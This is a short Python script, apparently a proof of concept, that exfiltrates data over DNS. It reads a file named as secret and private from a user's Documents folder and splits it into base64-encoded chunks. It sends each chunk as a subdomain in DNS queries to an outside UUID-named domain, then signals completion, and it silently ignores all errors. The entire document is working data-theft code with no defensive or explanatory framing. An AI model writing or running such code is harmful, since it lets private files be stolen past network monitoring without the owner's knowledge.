import dns.resolver as res
import base64

FILE = '/home/zachary/Documents/SECRET_PRIVATE_FILE'
STEP = 32
UUID = '94fc460d-be55-4d38-82a2-b7761a1e31b3.com'


def main():
    with open(FILE, 'r') as f:
        contents = f.read()
    lines = [contents[i:i+STEP] for i in range(0, len(contents), STEP)]
    encoded = [base64.urlsafe_b64encode(bytes(l, 'utf-8')).decode('utf-8') for l in lines]
    resolver = res.get_default_resolver()
    count = 0
    for i in range(0, len(encoded), 1):
        url = '.'.join([str(count), encoded[i], UUID])
        count += 1
        try:
            resolver.query(url)
        except:
            pass
    try:
        resolver.query('.'.join([str(count), 'done', UUID]))
    except:
        pass


if __name__ == '__main__':
    main()
